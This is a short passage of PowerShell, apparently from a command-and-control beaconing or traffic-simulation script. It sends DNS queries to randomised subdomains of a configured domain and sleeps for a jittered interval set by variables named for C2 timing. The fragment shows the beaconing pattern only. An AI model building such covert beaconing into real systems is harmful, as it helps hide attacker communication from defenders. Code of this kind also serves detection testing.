            $x2 = 1
        }
        else
        {
            $x2 = $x2 + 1
        }    
        if ($x3 -eq 7 )
        {
            Resolve-DnsName -type $QueryType $Sub3domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
            $x3 = 1
        }
        else
        {
            $x3 = $x3 + 1
        }
        $Jitter = ((Get-Random -Minimum -$C2Jitter -Maximum $C2Jitter) / 100 + 1) +$C2Interval
        Start-Sleep -Seconds $Jitter
